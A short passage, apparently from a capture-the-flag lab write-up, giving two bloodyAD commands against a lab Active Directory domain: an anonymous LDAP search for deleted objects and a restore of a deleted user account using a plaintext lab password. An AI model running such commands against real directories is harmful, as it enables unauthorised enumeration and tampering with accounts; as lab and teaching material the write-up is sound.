```bash
bloodyAD --host 10.129.1x.xx -d checkpoint.htb -u '' -p '' \
  get search --filter "(isDeleted=TRUE)" --base "DC=checkpoint,DC=htb" -c 1.2.840.113556.1.4.417
```

To **`RESTORE`** that object do:
```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

